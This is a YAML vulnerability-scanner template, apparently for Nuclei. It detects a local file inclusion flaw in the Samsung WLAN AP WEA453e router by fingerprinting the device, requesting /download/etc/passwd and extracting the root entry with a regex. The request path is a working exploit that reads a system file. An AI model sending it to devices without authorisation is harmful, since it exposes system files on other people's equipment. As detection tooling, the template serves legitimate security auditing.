id: samsung-wlan-ap-wea453e-lfi

info:
  name: Samsung WLAN AP WEA453e LFI
  author: Raiynin
  severity: high
  description: |
    This template detects a Local File Inclusion (LFI) vulnerability in the Samsung WLAN AP WEA453e by attempting to download the /etc/passwd file.
  reference:
    - https://ireadyoulearn.info/2020/11/27/exploiting-samsung-router-wlan-ap-wea453e/

http:
  - id: check-device
    method: GET
    path:
      - "{{BaseURL}}/"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "Samsung WLAN AP"
        part: body

  - id: check-lfi
    method: GET
    path:
      - "{{BaseURL}}/download/etc/passwd"
    matchers-condition: and
    matchers:
      - type: status
        status:
          - 200
      - type: word
        words:
          - "root:/bin/bash"
        part: body
      - type: word
        words:
          - "application/octet-stream"
        part: header
    extractors:
      - type: regex
        name: passwd
        part: body
        regex:
          - "root:(.+?):0:0:0:/root:/bin/bash"
